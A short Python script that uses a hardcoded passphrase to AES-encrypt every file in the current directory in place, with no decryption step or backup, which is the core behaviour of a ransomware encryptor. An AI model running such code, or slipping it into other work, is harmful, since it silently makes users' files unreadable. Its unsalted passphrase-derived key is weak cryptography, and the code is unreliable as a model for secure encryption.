import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Set encryption passphrase and derive key
passphrase = "testing123"
key = hashlib.sha256(passphrase.encode()).digest()  # 256-bit key from passphrase

# Function to pad data to be AES block size compliant
def pad(data):
    padding_required = AES.block_size - len(data) % AES.block_size
    return data + bytes([padding_required] * padding_required)

# Function to encrypt file contents
def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        plain_text = f.read()
    
    # Generate a new IV for each file
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Encrypt and write back to file with [IV][Ciphertext] format
    encrypted_data = iv + cipher.encrypt(pad(plain_text))
    with open(file_path, 'wb') as f:
        f.write(encrypted_data)
    
    print(f"Encrypted {file_path}")

# Encrypt all files in the current directory
for filename in os.listdir('.'):
    if os.path.isfile(filename):
        encrypt_file(filename)

